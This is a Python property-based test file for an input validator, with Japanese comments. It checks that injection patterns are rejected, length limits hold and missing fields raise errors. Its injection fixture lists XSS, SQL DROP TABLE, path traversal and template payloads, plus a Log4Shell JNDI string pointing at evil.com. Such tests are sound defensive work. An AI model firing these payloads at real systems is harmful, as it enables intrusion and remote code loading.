"""
test_input_validator.py — input_validator の Property-Based Tests（Hypothesis）
3 つの不変条件を検証する:
  Invariant 1: validate が成功した場合、返値の全 str フィールドはインジェクション検知パターンを含まない
  Invariant 2: validate が成功した場合、返値の全 str フィールドは 2000 文字以下
  Invariant 3: required フィールドが欠けている場合は必ず ValidationError が発生する
"""
import sys
import os
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "shared"))

from hypothesis import given, assume, settings
from hypothesis import strategies as st
from input_validator import validate, ValidationError, INJECTION_PATTERNS
import re

# 2000 文字を超えない安全な ASCII 文字列
_safe_text = st.text(
    alphabet=st.characters(blacklist_categories=("Cs",), blacklist_characters="<>&\"'`"),
    max_size=200,
)

# インジェクション文字を含む文字列（検知されるべき）
_injection_strings = st.sampled_from([
    "<script>alert(1)</script>",
    "'; DROP TABLE users; --",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "/../etc/passwd",
    "__proto__",
    "javascript:alert(1)",
    "onmouseover=alert(1)",
])

_SCHEMA = {
    "required": ["name", "message"],
    "properties": {
        "name":    {"type": "string", "maxLength": 100},
        "message": {"type": "string", "maxLength": 2000},
    },
}


# --- Invariant 1: バリデーション通過後の文字列にインジェクションパターンが含まれない ---
@given(
    name=_safe_text,
    message=_safe_text,
)
@settings(max_examples=200)
def test_invariant1_no_injection_after_validate(name, message):
    """valid な入力がバリデーションを通過した後、結果にインジェクションパターンが含まれない。"""
    assume(len(name) > 0 and len(message) > 0)
    body = {"name": name, "message": message}
    result = validate(body, _SCHEMA)
    for pattern in INJECTION_PATTERNS:
        assert not re.search(pattern, result["name"], re.IGNORECASE), (
            f"Injection pattern found in 'name': {result['name']}"
        )
        assert not re.search(pattern, result["message"], re.IGNORECASE), (
            f"Injection pattern found in 'message': {result['message']}"
        )


# --- Invariant 2: バリデーション通過後の全 str フィールドは maxLength 以下 ---
@given(
    name=st.text(max_size=100),
    message=st.text(max_size=2000),
)
@settings(max_examples=200)
def test_invariant2_length_constraint(name, message):
    """valid な入力はバリデーション後も maxLength を超えない。"""
    assume(len(name) > 0 and len(message) > 0)
    # インジェクション文字が含まれる場合はスキップ（Invariant 1 でカバー）
    for pattern in INJECTION_PATTERNS:
        assume(not re.search(pattern, name, re.IGNORECASE))
        assume(not re.search(pattern, message, re.IGNORECASE))

    body = {"name": name, "message": message}
    result = validate(body, _SCHEMA)
    assert len(result["name"]) <= 100
    assert len(result["message"]) <= 2000


# --- Invariant 3: required フィールドが欠けると ValidationError ---
@given(
    missing_field=st.sampled_from(["name", "message"]),
    name=_safe_text,
    message=_safe_text,
)
@settings(max_examples=50)
def test_invariant3_missing_required_raises(missing_field, name, message):
    """required フィールドが欠けている入力は必ず ValidationError を発生させる。"""
    body = {"name": name, "message": message}
    del body[missing_field]
    with pytest.raises(ValidationError):
        validate(body, _SCHEMA)


# --- インジェクション文字列が必ず拒否される ---
@given(injection=_injection_strings, extra=_safe_text)
@settings(max_examples=100)
def test_injection_strings_rejected(injection, extra):
    """既知のインジェクション文字列は validate で必ず ValidationError が発生する。"""
    body = {"name": injection, "message": extra if extra else "test"}
    with pytest.raises(ValidationError):
        validate(body, _SCHEMA)
